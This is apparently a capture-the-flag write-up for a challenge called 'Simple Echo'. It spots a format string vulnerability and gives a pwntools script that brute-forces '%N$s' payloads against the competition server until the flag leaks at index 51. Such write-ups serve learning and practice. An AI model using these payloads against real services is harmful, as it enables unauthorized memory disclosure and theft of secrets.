# Simple Echo

> A simple program to echo back user input. What could possibly go wrong?

1. Using GDB, look at `main` function. It simply takes a string as input and `printf`s it. Clearly a format string vulnerability.
2. Brute force:

    ```python
    from pwn import *

    for i in range(1, 100):
        try:
            p = remote('simple-echo.2024-bq.ctfcompetition.com', 1337)
            p.recvuntil(b'Type input to be echoed: ')
            
            payload = f'%{i}$s'.encode()

            p.sendline(payload)
            sleep(2)
            p.recvuntil(b'Echoed output: \n')
            op = p.recvline()
            print(op, "index:",i)
            p.close()
        except:
            pass
    ```

    We get the flag at index **51**
